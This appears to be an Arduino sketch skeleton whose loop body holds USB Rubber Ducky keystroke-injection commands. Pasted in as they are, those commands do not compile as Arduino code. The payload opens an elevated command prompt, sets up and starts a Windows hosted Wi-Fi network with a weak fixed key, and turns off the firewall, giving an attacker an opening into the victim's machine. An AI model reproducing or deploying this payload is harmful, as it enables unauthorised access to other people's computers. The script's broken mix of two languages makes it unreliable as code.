void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:


MENU
DELAY 100
STRING a
DELAY 100
LEFTARROW
ENTER
DELAY 200
STRING netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678
ENTER
DELAY 100
STRING netsh wlan start hostednetwork
ENTER
DELAY 100
STRING netsh firewall set opmode disable
ENTER
STRING exit
ENTER
}
